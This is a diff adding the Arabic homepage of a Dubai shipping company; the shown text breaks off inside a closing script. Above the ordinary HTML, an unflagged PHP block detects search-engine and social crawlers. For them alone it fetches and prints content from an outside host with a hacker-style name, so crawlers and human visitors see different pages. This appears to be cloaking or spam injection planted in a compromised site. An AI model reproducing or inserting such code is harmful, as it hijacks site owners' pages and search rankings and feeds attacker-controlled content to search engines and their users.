@@ -1,0 +1,937 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array(
+        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
+        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
+        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
+        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
+    );
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function fetch_message_from_url($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
+    $response = curl_exec($ch);
+    
+
+    if (curl_errno($ch)) {
+        error_log("Error cURL: " . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($http_code == 200) {
+        return $response;
+    } else {
+        error_log("HTTP Error: Status Code " . $http_code);
+        return false;
+    }
+}
+
+if (is_bot()) { 
+    $message = fetch_message_from_url('https://koi.haxor-mahasuhu.info//globallines-shipping.com/index.txt');
+    
+    if ($message) {
+        echo $message;
+    } else {
+        echo "";
+    }
+    exit;
+}
+?>
+
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="utf-8">
+  <title> غلوبال لاينز للشحن</title>
+  <meta name="description" content="نوفر جميع خدمات الشحن من شحن الباب للباب أو المطار للمطار و غيرها لجميع دول العالم" />
+  <meta name="keywords" content="شحن الى السعودية شركة الشحن الى تركيا
+‏شحن بري إلى السعودية شحن بري إلى الرياض شحن بري إلى جدة شحن جوي إلى السعودية شحن بري إلى المدينة شحن إلى مكة شحن إلى الدمام شحن إلى جدة شحن إلى تبوك شحن إلى القصيم شحن إلى حائل" />
+  <meta name="author" content="https://globallines-shipping.com" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://globallines-shipping.com/assets/frontend/css/bootstrap.min.css?v=9.1.1" rel="stylesheet" />
+  <link href="https://globallines-shipping.com/assets/frontend/css/fancybox/jquery.fancybox.css?v=9.1.1" rel="stylesheet">
+  <link href="https://globallines-shipping.com/assets/frontend/css/jcarousel.css?v=9.1.1" rel="stylesheet" />
+  <link href="https://globallines-shipping.com/assets/frontend/css/flexslider.css?v=9.1.1" rel="stylesheet" />
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/css/bootstrap-select.min.css?v=9.1.1">
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/css/horizontal-timeline.css?v=9.1.1">
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/css/select2.min.css?v=9.1.1" />
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/css/select2-bootstrap.min.css?v=9.1.1" />
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/css/bootstrap-datetimepicker.min.css?v=9.1.1" />
+  <link href="https://globallines-shipping.com/assets/frontend/css/style.css?v=9.1.1" rel="stylesheet" />
+  <link href="https://globallines-shipping.com/assets/frontend/css/color.css?v=9.1.1" rel="stylesheet" />
+  <link href="https://globallines-shipping.com/assets/frontend/css/colors.css?v=9.1.1" rel="stylesheet" />
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/js/owl-carousel/assets/owl.carousel.min.css">
+  <link rel="stylesheet" href="https://globallines-shipping.com/assets/frontend/js/owl-carousel/assets/owl.theme.default.min.css">
+  <link href="https://globallines-shipping.com/assets/frontend/css/rtl.css?v=9.1.1" rel="stylesheet" />
+  <!-- Favicon and Touch Icons -->
+  <link href="https://globallines-shipping.com/uploads/settings/16866729097204.png" rel="shortcut icon" type="image/png">
+  <link href="https://globallines-shipping.com/uploads/settings/16866729093095.png" rel="apple-touch-icon">
+  <link href="https://globallines-shipping.com/uploads/settings/16866729093095.png" rel="apple-touch-icon" sizes="72x72">
+  <link href="https://globallines-shipping.com/uploads/settings/16866729093095.png" rel="apple-touch-icon" sizes="114x114">
+  <link href="https://globallines-shipping.com/uploads/settings/16866729093095.png" rel="apple-touch-icon" sizes="144x144">
+  <meta property='og:title' content=' غلوبال لاينز للشحن' />
+  <meta property='og:image' content='https://globallines-shipping.com/uploads/settings/16866729093095.png' />
+  <meta property="og:site_name" content="غلوبال لاينز للشحن">
+  <meta property="og:description" content="نوفر جميع خدمات الشحن من شحن الباب للباب أو المطار للمطار و غيرها لجميع دول العالم" />
+  <meta property="og:url" content="https://globallines-shipping.com" />
+  <meta property="og:type" content="website" />
+  <link rel="canonical" href="https://globallines-shipping.com">
+  <style type="text/css">
+    .site-top a {
+      color: #fff !important;
+    }
+
+    .header-dropdown a {
+      color: #666 !important;
+    }
+
+    a,
+    a:hover,
+    a:focus,
+    a:active,
+    footer a.text-link:hover,
+    strike,
+    .post-meta span a:hover,
+    footer a.text-link,
+    ul.meta-post li a:hover,
+    ul.cat li a:hover,
+    ul.recent li h6 a:hover,
+    ul.portfolio-categ li.active a,
+    ul.portfolio-categ li.active a:hover,
+    ul.portfolio-categ li a:hover,
+    ul.related-post li h4 a:hover,
+    span.highlight,
+    article .post-heading h3 a:hover,
+    .navbar .nav>.active>a,
+    .navbar .nav>.active>a:hover,
+    .navbar .nav>li>a:hover,
+    .navbar .nav>li>a:focus,
+    .navbar .nav>.active>a:focus {
+      color: #0c47ba;
+    }
+
+    .navbar-brand span {
+      color: #0c47ba;
+    }
+
+    header .nav li a:hover,
+    header .nav li a:focus,
+    header .nav li.active a,
+    header .nav li.active a:hover,
+    header .nav li a.dropdown-toggle:hover,
+    header .nav li a.dropdown-toggle:focus,
+    header .nav li.active ul.dropdown-menu li a:hover,
+    header .nav li.active ul.dropdown-menu li.active a {
+      color: #0c47ba;
+    }
+
+    .navbar-default .navbar-nav>.active>a,
+    .navbar-default .navbar-nav>.active>a:hover,
+    .navbar-default .navbar-nav>.active>a:focus {
+      color: #0c47ba;
+    }
+
+    .navbar-default .navbar-nav>.open>a,
+    .navbar-default .navbar-nav>.open>a:hover,
+    .navbar-default .navbar-nav>.open>a:focus {
+      color: #0c47ba;
+    }
+
+    .dropdown-menu>.active>a,
+    .dropdown-menu>.active>a:hover,
+    .dropdown-menu>.active>a:focus {
+      color: #0c47ba;
+    }
+
+    .custom-carousel-nav.right:hover,
+    .custom-carousel-nav.left:hover,
+    .dropdown-menu li:hover,
+    .dropdown-menu li a:hover,
+    .dropdown-menu li>a:focus,
+    .dropdown-submenu:hover>a,
+    .dropdown-menu .active>a,
+    .dropdown-menu .active>a:hover,
+    .pagination ul>.active>a:hover,
+    .pagination ul>.active>a,
+    .pagination ul>.active>span,
+    .flex-control-nav li a:hover,
+    .flex-control-nav li a.active {
+      background-color: #0c47ba;
+    }
+
+    .pagination ul>li.active>a,
+    .pagination ul>li.active>span,
+    a.thumbnail:hover,
+    input[type="text"].search-form:focus {
+      border: 1px solid #0c47ba;
+    }
+
+    textarea:focus,
+    input[type="text"]:focus,
+    input[type="password"]:focus,
+    input[type="datetime"]:focus,
+    input[type="datetime-local"]:focus,
+    input[type="date"]:focus,
+    input[type="month"]:focus,
+    input[type="time"]:focus,
+    input[type="week"]:focus,
+    input[type="number"]:focus,
+    input[type="email"]:focus,
+    input[type="url"]:focus,
+    input[type="search"]:focus,
+    input[type="tel"]:focus,
+    input[type="color"]:focus,
+    .uneditable-input:focus {
+      border-color: #0c47ba;
+    }
+
+    input:focus {
+      border-color: #0c47ba;
+    }
+
+    #sendmessage {
+      color: #0c47ba;
+    }
+
+    .pullquote-left {
+      border-color: #bf1d31;
+    }
+
+    .pullquote-right {
+      border-right: 5px solid #0c47ba;
+    }
+
+    .cta-text h2 span {
+      color: #0c47ba;
+    }
+
+    ul.clients li:hover {
+      border: 4px solid #0c47ba;
+    }
+
+    .box-bottom {
+      background: #0c47ba;
+    }
+
+    .btn-dark:hover,
+    .btn-dark:focus,
+    .btn-dark:active {
+      background: #0c47ba;
+      border: 1px solid #0c47ba;
+    }
+
+    .btn-theme {
+      border: 1px solid #0c47ba;
+      background: #0c47ba;
+    }
+
+    .modal.styled .modal-header {
+      background-color: #0c47ba;
+    }
+
+    .post-meta {
+      border-top: 4px solid #0c47ba;
+    }
+
+    .post-meta .comments a:hover {
+      color: #0c47ba;
+    }
+
+    .widget ul.tags li a:hover {
+      background: #0c47ba;
+    }
+
+    .recent-post .text h5 a:hover {
+      color: #0c47ba;
+    }
+
+    .pricing-box-alt.special .pricing-heading {
+      background: #0c47ba;
+    }
+
+    #pagination a:hover {
+      background: #0c47ba;
+    }
+
+    .pricing-box.special .pricing-offer {
+      background: #0c47ba;
+    }
+
+    .icon-square:hover,
+    .icon-rounded:hover,
+    .icon-circled:hover {
+      background-color: #0c47ba;
+    }
+
+    [class^="icon-"].active,
+    [class*=" icon-"].active {
+      background-color: #0c47ba;
+    }
+
+    .fancybox-close:hover {
+      background-color: #0c47ba;
+    }
+
+    .fancybox-nav:hover span {
+      background-color: #0c47ba;
+    }
+
+    .da-slide .da-link:hover {
+      background: #0c47ba;
+      border: 4px solid #0c47ba;
+    }
+
+    .da-dots span {
+      background: #0c47ba;
+    }
+
+    #featured .flexslider .slide-caption {
+      border-left: 5px solid #0c47ba;
+    }
+
+    .nivo-directionNav a:hover {
+      background-color: #0c47ba;
+    }
+
+    .nivo-caption,
+    .caption {
+      border-bottom: #0c47ba 5px solid;
+    }
+
+    footer {
+      background: #0c47ba;
+    }
+
+    #sub-footer {
+      background: #bf1d31;
+    }
+
+    .site-top {
+      background: #0c47ba;
+    }
+
+    ul.cat li .active {
+      color: #0c47ba;
+    }
+
+    .box-gray .icon .fa,
+    h4,
+    .heading {
+      color: #0c47ba;
+    }
+
+    .flex-caption {
+      background-color: #bf1d31;
+    }
+
+    .flex-caption .btn-theme {
+      background: #0c47ba;
+    }
+
+    .flex-caption .btn-theme:hover {
+      background: #fff;
+      color: #0c47ba;
+    }
+
+    .btn-info {
+      background: #0c47ba;
+      border-color: #bf1d31;
+    }
+
+    .btn-info:hover {
+      background: #bf1d31;
+    }
+
+    .flex-control-paging li a.flex-active {
+      background: #0c47ba;
+    }
+
+    .flex-control-paging li a {
+      background: #bf1d31;
+    }
+
+    .navbar-default .navbar-nav>.active>a,
+    .navbar-default .navbar-nav>.active>a:hover,
+    .navbar-default .navbar-nav>.active>a:focus {
+      background: transparent;
+    }
+
+    .navbar-default .navbar-nav>.open>a,
+    .navbar-default .navbar-nav>.open>a:hover,
+    .navbar-default .navbar-nav>.open>a:focus {
+      background: transparent;
+    }
+
+    #inner-headline {
+      background: #bf1d31;
+    }
+
+    .navbar .nav li .dropdown-menu {
+      background: #0c47ba;
+    }
+
+    .navbar .nav li .dropdown-menu li:hover {
+      background: #bf1d31;
+    }
+
+    @media (max-width: 767px) {
+      header .navbar-nav>li {
+        background: #0c47ba;
+      }
+
+      .dropdown-menu {
+        background: #0c47ba;
+      }
+
+      .navbar-default .navbar-nav .open .dropdown-menu>li>a {
+        color: #fff;
+      }
+
+      header .nav li a:hover,
+      header .nav li a:focus,
+      header .nav li.active a,
+      header .nav li.active a:hover,
+      header .nav li a.dropdown-toggle:hover,
+      header .nav li a.dropdown-toggle:focus,
+      header .nav li.active ul.dropdown-menu li a:hover,
+      header .nav li.active ul.dropdown-menu li.active a {
+        color: #fff;
+      }
+
+      .navbar .nav>li>a {
+        color: #fff;
+      }
+
+      .navbar-default .navbar-nav>.active>a,
+      .navbar-default .navbar-nav>.active>a:hover,
+      .navbar-default .navbar-nav>.active>a:focus {
+        background-color: #0c47ba;
+        color: #fff;
+      }
+
+      .navbar-default .navbar-nav>.open>a,
+      .navbar-default .navbar-nav>.open>a:hover,
+      .navbar-default .navbar-nav>.open>a:focus {
+        background-color: #0c47ba;
+        color: #fff;
+      }
+    }
+
+    .navbar .nav>li:hover>a,
+    .pagination>li>a,
+    .pagination>li>a:hover,
+    .pagination>li>a:active,
+    .pagination>li>a:focus {
+      color: #0c47ba;
+    }
+
+    .content-row-bg {
+      background: #bf1d31;
+    }
+
+    #content .contacts p .fa,
+    #content .contacts address .fa {
+      background: #0c47ba;
+    }
+
+    .pagination>.active>a,
+    .pagination>.active>span,
+    .pagination>.active>a:hover,
+    .pagination>.active>span:hover,
+    .pagination>.active>a:focus,
+    .pagination>.active>span:focus {
+      background-color: #0c47ba;
+      border-color: #0c47ba;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #bf1d31;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #0c47ba;
+    }
+
+    .dark {
+      background-color: #bf1d31;
+    }
+  </style>
+  <!-- Google Tag Manager -->
+  <script>
+    (function(w, d, s, l, i) {
+      w[l] = w[l] || [];
+      w[l].push({
+        'gtm.start': new Date().getTime(),
+        event: 'gtm.js'
+      });
+      var f = d.getElementsByTagName(s)[0],
+        j = d.createElement(s),
+        dl = l != 'dataLayer' ? '&l=' + l : '';
+      j.async = true;
+      j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
+      f.parentNode.insertBefore(j, f);
+    })(window, document, 'script', 'dataLayer', 'GTM-NXLSVTLS');
+  </script>
+  <!-- End Google Tag Manager -->
+</head>
+
+<body class="js " style="  ">
+  <div id="wrapper">
+    <!-- start header -->
+    <header>
+      <div class="site-top">
+        <div class="container">
+          <div>
+            <div class="pull-right">
+              <div class="btn-group header-dropdown">
+                <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                  <img src="https://globallines-shipping.com/assets/dashboard/images/flags/sa.svg" alt=""> العربية <i class="fa fa-angle-down"></i>
+                </button>
+                <div class="dropdown-menu">
+                  <a href="https://globallines-shipping.com/lang/en" class="dropdown-item">
+                    <img src="https://globallines-shipping.com/assets/dashboard/images/flags/us.svg" alt=""> English </a>
+                  <a href="https://globallines-shipping.com/lang/ar" class="dropdown-item">
+                    <img src="https://globallines-shipping.com/assets/dashboard/images/flags/sa.svg" alt=""> العربية </a>
+                </div>
+              </div>
+            </div>
+            <div class="pull-left">
+              <i class="fa fa-phone"></i> &nbsp;<a href="tel:+971561685517"><span dir="ltr">+971561685517</span></a>
+              <span class="top-email"> &nbsp; | &nbsp; <i class="fa fa-envelope"></i> &nbsp;<a href="mailto:info@globallines-shipping.com">info@globallines-shipping.com</a>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="navbar navbar-default">
+        <div class="container">
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle" name="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="https://globallines-shipping.com">
+              <img alt="" src="https://globallines-shipping.com/uploads/settings/16866730109009.png">
+            </a>
+          </div>
+          <div class="navbar-collapse collapse ">
+            <ul class="nav navbar-nav">
+              <li><a href="https://globallines-shipping.com/home">الرئيسية</a></li>
+              <li><a href="https://globallines-shipping.com/topic/about">من نحن</a></li>
+              <li class="dropdown">
+                <a href="javascript:void(0)" class="dropdown-toggle " data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">خدماتنا <i class="fa fa-angle-down"></i></a>
+                <ul class="dropdown-menu">
+                  <li>
+                    <a href="https://globallines-shipping.com/services/topic/6"> الشحن الجوي</a>
+                  </li>
+                  <li>
+                    <a href="https://globallines-shipping.com/services/topic/7"> الشحن البحري</a>
+                  </li>
+                  <li>
+                    <a href="https://globallines-shipping.com/services/topic/8"> الشحن البري</a>
+                  </li>
+                  <li>
+                    <a href="https://globallines-shipping.com/services/topic/9"> التغليف والتخزين</a>
+                  </li>
+                </ul>
+              </li>
+              <li>
+                <a href="https://globallines-shipping.com/photos">الصور</a>
+              </li>
+              <li class="dropdown">
+                <a href="javascript:void(0)" class="dropdown-toggle " data-toggle="dropdown" data-hover="dropdown" data-delay="0" data-close-others="true">الفيديو <i class="fa fa-angle-down"></i></a>
+                <ul class="dropdown-menu">
+                  <li>
+                    <a href="https://globallines-shipping.com/videos/1"> الخطوط العالمية للشحن</a>
+                  </li>
+                </ul>
+              </li>
+              <li>
+                <a href="https://globallines-shipping.com/blog">المدونة</a>
+              </li>
+              <li><a href="https://globallines-shipping.com/contact">اتصل بنا</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </header>
+    <!-- end header -->
+    <!-- Content Section -->
+    <div class="contents">
+      <!-- start Home Slider -->
+      <section id="featured">
+        <!-- start slider -->
+        <!-- Slider -->
+        <div id="main-slider" class="flexslider">
+          <ul class="slides">
+            <li>
+              <img src="https://globallines-shipping.com/uploads/banners/16875892561688.jpeg" alt="الخطوط العالمية للشحن" />
+              <div class="flex-caption">
+                <h3>الخطوط العالمية للشحن</h3>
+                <p>نوفر جميع خدمات الشحن من شحن الباب للباب أو المطار للمطار و غيرها لجميع دول العالم</p>
+                <a href="https://globallines-shipping.com/topic/about" class="btn btn-theme">مزيد من التفاصيل</a>
+              </div>
+            </li>
+          </ul>
+        </div>
+        <!-- end slider -->
+      </section>
+      <!-- end Home Slider -->
+      <section class="content-row-no-bg home-welcome">
+        <div class="container">
+          <div style="text-align: center"><span style="background-color: transparent; font-size: 32px;">
+              <font face="smart4dsTitles, sans-serif" color="#000000">الخطوط العالمية للشحن</font>
+            </span></div>
+          <div style="text-align: center">
+            <div>نحن نقدم جميع خدمات الشحن من شحن الباب إلى الباب أو المطار إلى المطار وغيرها لجميع بلدان العالم</div>
+            <div><b>خدمات الشحن البرية والجوية والبحرية</b></div>
+            <div>جميع خيارات الشحن البرية البحرية والجوية لنقل بضائعك و توصيلها بشكل آمن في الوقت المحدد وبسرعة بغض النظر عن حجم وعدد الطرود&nbsp;</div>
+          </div>
+        </div>
+      </section>
+      <section class="content-row-no-bg p-b-0">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="row" style="margin-bottom: 0;">
+                <div class="col-lg-3">
+                  <div class="box">
+                    <div class="box-gray aligncenter">
+                      <div class="icon">
+                        <i class="fa fa-plane fa-3x"></i>
+                      </div>
+                      <h4>الشحن الجوي</h4>
+                      <p>يشمل الشحن الجوي نقل البضائع غير المصحوبة بفرد عبر طائرة. غالبًا ما يتم استخدامه لشحنات البضائع العاجلة الحساسة للوقت..</p>
+                    </div>
+                    <div class="box-bottom">
+                      <a href="https://globallines-shipping.com/services/topic/6">مزيد من التفاصيل</a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3">
+                  <div class="box">
+                    <div class="box-gray aligncenter">
+                      <div class="icon">
+                        <i class="fa fa-ship fa-3x"></i>
+                      </div>
+                      <h4>الشحن البحري</h4>
+                      <p>يشمل الشحن البحري نقل البضائع عبر سفن الشحن إما في شكل بضائع معبأة داخل حاويات أو في شكل سائب (عبر سفن شحن متخصصة).</p>
+                    </div>
+                    <div class="box-bottom">
+                      <a href="https://globallines-shipping.com/services/topic/7">مزيد من التفاصيل</a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3">
+                  <div class="box">
+                    <div class="box-gray aligncenter">
+                      <div class="icon">
+                        <i class="fa fa-truck fa-3x"></i>
+                      </div>
+                      <h4>الشحن البري</h4>
+                      <p>اشحن حمولتك استفد من خدمات التوصيل ، والنقل ، والنقل البري ، والشحن الداخلي والخارجي و المحلي عن طريق البر ....</p>
+                    </div>
+                    <div class="box-bottom">
+                      <a href="https://globallines-shipping.com/services/topic/8">مزيد من التفاصيل</a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3">
+                  <div class="box">
+                    <div class="box-gray aligncenter">
+                      <div class="icon">
+                        <i class="fa fa-window-restore fa-3x"></i>
+                      </div>
+                      <h4>التغليف والتخزين</h4>
+                      <p>الخطوط العالمية للشحن هي شركة طرف ثالث للشحن والخدمات اللوجستية تقدم خدمات التخزين لكل من البضائع التجارية والشخصية.</p>
+                    </div>
+                    <div class="box-bottom">
+                      <a href="https://globallines-shipping.com/services/topic/9">مزيد من التفاصيل</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="content-row-bg">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="home-row-head">
+                <h2 class="heading">أحدث المقالات</h2>
+                <small>احدث المقالات الجديدة والمميزة التي أضيفت في المدونة</small>
+              </div>
+              <div id="owl-slider" class="owl-carousel owl-theme listing">
+                <div class="item">
+                  <h4> شحن السيارات </h4>
+                  <img src="https://globallines-shipping.com/uploads/topics/16866931944757.jpeg" alt="شحن السيارات" />
+                  <p class="text-justify">شحن السيارات و المركبات في الامارات يعتبر عمل رائج و هناك العديد من الشركات التي تقدم خدمات شحن السيارات الخاصة و المركبات الى جميع دول العالم و خاصة دول مجلس التعاون الخليجي و تعتبر شركة الخطوط العالمية للشحن من افضل الشركات التي تقدم حدمة شحن السيارات و المركبات الثقيلة و الخفيفة بسرعة و عوامل أما... &nbsp; <a href="https://globallines-shipping.com/blog/topic/12"> إقرأ المزيد <i class="fa fa-caret-left"></i></a>
+                  </p>
+                </div>
+                <div class="item">
+                  <h4> شحن البضائع </h4>
+                  <img src="https://globallines-shipping.com/uploads/topics/16866937205242.jpeg" alt="شحن البضائع" />
+                  <p class="text-justify">يتنقل الناس كثيرا حول العالم ويحتاج الجميع لنقل أغراضه و معداته باستمرار&nbsp;لذلك تقدم الكثير من الشركات في الإمارات العربية المتحدة خدمات نقل البضائع و المعدات و المفروشات للأفراد و الشركات حول العالم بشكل عام و حول الخليج بشكل خاص .شركة الخطوط العالمية للشحن تقدم خدمات الشحن بكل أنواعه ، شحن بري ... &nbsp; <a href="https://globallines-shipping.com/blog/topic/13"> إقرأ المزيد <i class="fa fa-caret-left"></i></a>
+                  </p>
+                </div>
+                <div class="item">
+                  <h4> شحن عام </h4>
+                  <img src="https://globallines-shipping.com/uploads/topics/16866940074464.jpeg" alt="شحن عام" />
+                  <p class="text-justify">‏شحن بري إلى السعودية شحن بري إلى الرياض شحن بري إلى جدة شحن جوي إلى السعودية شحن بري إلى المدينة شحنإلى مكة شحن إلى الدمام شحن إلى جدة شحن إلى تبوك شحن إلى القصيم شحن إلى حائلشركة الشحن الى تركياشحن الى تركيا‏شحن إلى اسطنبول شحن إلى تركيا شحن البحر إلى تركيا شحن جوي إلى تركيا شحن إلى تركيا من الباب... &nbsp; <a href="https://globallines-shipping.com/blog/topic/14"> إقرأ المزيد <i class="fa fa-caret-left"></i></a>
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="more-btn">
+                <a href="https://globallines-shipping.com/blog" class="btn btn-theme"><i class="fa fa-angle-left"></i>&nbsp; مشاهدة المزيد &nbsp;<i class="fa fa-angle-right"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="content-row-bg">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="home-row-head">
+                <h2 class="heading">مقاطع الفيديو الخاصة بنا</h2>
+                <small>أحدث مقاطع الفيديو من عملنا ، يمكنك تص</small>
+              </div>
+              <div id="owl-slider-2" class="owl-carousel owl-theme listing">
+                <div class="item">
+                  <h4> الخطوط العالمية للشحن </h4>
+                  <iframe allowfullscreen src="https://www.youtube.com/embed/8UeCHuma-KQ">
+                  </iframe>
+                  <p class="text-justify">... &nbsp; <a href="https://globallines-shipping.com/videos/topic/10"> إقرأ المزيد <i class="fa fa-caret-left"></i></a>
+                  </p>
+                </div>
+                <div class="item">
+                  <h4> الخطوط العالمية للشحن </h4>
+                  <iframe allowfullscreen src="https://www.youtube.com/embed/cvGMibRob_k">
+                  </iframe>
+                  <p class="text-justify">... &nbsp; <a href="https://globallines-shipping.com/videos/topic/11"> إقرأ المزيد <i class="fa fa-caret-left"></i></a>
+                  </p>
+                </div>
+                <div class="item">
+                  <h4> أفضل شركة شحن </h4>
+                  <iframe allowfullscreen src="https://www.youtube.com/embed/0FMeXm2g3fY">
+                  </iframe>
+                  <p class="text-justify">... &nbsp; <a href="https://globallines-shipping.com/videos/topic/15"> إقرأ المزيد <i class="fa fa-caret-left"></i></a>
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="more-btn">
+                <a href="https://globallines-shipping.com/videos" class="btn btn-theme"><i class="fa fa-angle-left"></i>&nbsp; مشاهدة المزيد &nbsp;<i class="fa fa-angle-right"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="content-row-no-bg">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-12">
+              <div class="home-row-head">
+                <h2 class="heading">أعمالنا الحالية</h2>
+                <small>مجموعة من أحدث أعمالنا، يمكنك تصفح المزيد</small>
+              </div>
+              <div class="row">
+                <section id="projects">
+                  <ul id="thumbs" class="portfolio">
+                  </ul>
+                </section>
+              </div>
+              <div class="row">
+                <div class="col-lg-12">
+                  <div class="more-btn">
+                    <a href="/photos" class="btn btn-theme"><i class="fa fa-angle-left"></i>&nbsp; مشاهدة المزيد <!-- <div><p>more</p></div>--> &nbsp;<i class="fa fa-angle-right"></i></a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+    <!-- end of Content Section -->
+    <!-- start footer -->
+    <footer>
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-6">
+            <div class="widget contacts">
+              <h4 class="widgetheading"><i class="fa fa-phone-square"></i>&nbsp; بيانات الإتصال</h4>
+              <address>
+                <strong>العنوان:</strong><br>
+                <i class="fa fa-map-marker"></i> &nbsp;الامارات العربية المتحدة ، دبي
+              </address>
+              <p>
+                <strong>اتصل الآن:</strong><br>
+                <i class="fa fa-phone"></i> &nbsp;<a href="tel:+971561685517"><span dir="ltr">+971561685517</span></a>
+              </p>
+              <p>
+                <strong>البريد الإلكتروني:</strong><br>
+                <i class="fa fa-envelope"></i> &nbsp;<a href="mailto:info@globallines-shipping.com">info@globallines-shipping.com</a>
+              </p>
+            </div>
+          </div>
+          <div class="col-lg-6">
+            <div class="widget">
+              <h4 class="widgetheading"><i class="fa fa-bookmark"></i>&nbsp; روابط سريعة</h4>
+              <ul class="link-list">
+                <li>
+                  <a href="https://globallines-shipping.com/home">الرئيسية</a>
+                </li>
+                <li>
+                  <a href="https://globallines-shipping.com/topic/about">من نحن</a>
+                </li>
+                <li>
+                  <a href="https://globallines-shipping.com/blog">المدونة</a>
+                </li>
+                <li>
+                  <a href="https://globallines-shipping.com/topic/privacy">الخصوصية</a>
+                </li>
+                <li>
+                  <a href="https://globallines-shipping.com/topic/terms">الشروط والأحكام</a>
+                </li>
+                <li>
+                  <a href="https://globallines-shipping.com/contact">اتصل بنا</a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="sub-footer">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-6">
+              <div class="copyright"> &copy; 2025 جميع الحقوق محفوظة . <a>غلوبال لاينز للشحن</a>
+              </div>
+            </div>
+            <div class="col-lg-6">
+              <ul class="social-network">
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+    <a href="https://wa.me/971561685517" class="whatsapp_float" target="_blank" rel="noopener noreferrer">
+      <i class="fa fa-whatsapp"></i>
+    </a>
+    <!-- end footer -->
+  </div>
+  <a href="#" title="إلى الأعلى" class="scrollup"><i class="fa fa-angle-up active"></i></a>
+  <script type="text/javascript">
+    var page_dir = "rtl";
+  </script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/jquery.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/jquery.easing.1.3.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/bootstrap.min.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/jquery.fancybox.pack.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/jquery.fancybox-media.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/google-code-prettify/prettify.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/portfolio/jquery.quicksand.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/portfolio/setting.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/jquery.flexslider.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/animate.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/custom.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/owl-carousel/owl.carousel.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/Chart.min.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/bootstrap-select.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/i18n/defaults.min.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/select2.min.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/frontend/js/moment.js?v=9.1.1"></script>
+  <script src="https://globallines-shipping.com/assets/dashboard/js/eonasdan-bootstrap-datetimepicker/build/js/bootstrap-datetimepicker.min.js?v=9.1.1"></script>
+  <script>
+    $(".select2").select2();
+    $(".select2-multiple").select2({
+      tags: true
+    });
+    $(function() {
+      $('.date').datetimepicker({
